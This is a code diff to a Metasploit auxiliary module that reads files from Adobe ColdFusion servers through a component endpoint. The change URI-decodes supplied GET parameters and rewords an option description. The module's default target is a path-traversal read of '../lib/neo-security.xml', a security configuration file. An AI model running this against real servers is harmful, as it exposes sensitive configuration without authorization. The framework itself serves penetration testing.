@@ -44,7 +44,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('TARGETFILE', [true, 'The target file to read, relative to the wwwroot folder.', '../lib/neo-security.xml']),
         OptString.new('CFC_ENDPOINT', [true, 'The target ColdFusion Component (CFC) endpoint', nil]),
         OptString.new('CFC_METHOD', [true, 'The target ColdFusion Component (CFC) remote method name', nil]),
-        OptString.new('CFC_METHOD_PARAMETERS', [false, 'The target ColdFusion Component (CFC) remote method parameters (e.g. "param1=foo&param2=bar")', ''])
+        OptString.new('CFC_METHOD_PARAMETERS', [false, 'Additional target ColdFusion Component (CFC) remote method parameters to supply via a GET request (e.g. "param1=foo&param2=hello%20world")', ''])
       ]
     )
   end
@@ -76,8 +76,14 @@ class MetasploitModule < Msf::Auxiliary
     # If the CFC_METHOD required parameters, extract them from CFC_METHOD_PARAMETERS and add to the vars_get Hash.
     unless datastore['CFC_METHOD_PARAMETERS'].blank?
       datastore['CFC_METHOD_PARAMETERS'].split('&').each do |pair|
-        k, v = pair.split('=', 2)
-        vars_get[k] = v
+        param_name, param_value = pair.split('=', 2)
+
+        # URI decode the supplied param name and value as they will be encoded again during send_request_cgi.
+        param_name = Rex::Text.uri_decode(param_name)
+
+        param_value = param_value ? Rex::Text.uri_decode(param_value) : nil
+
+        vars_get[param_name] = param_value
       end
     end
 
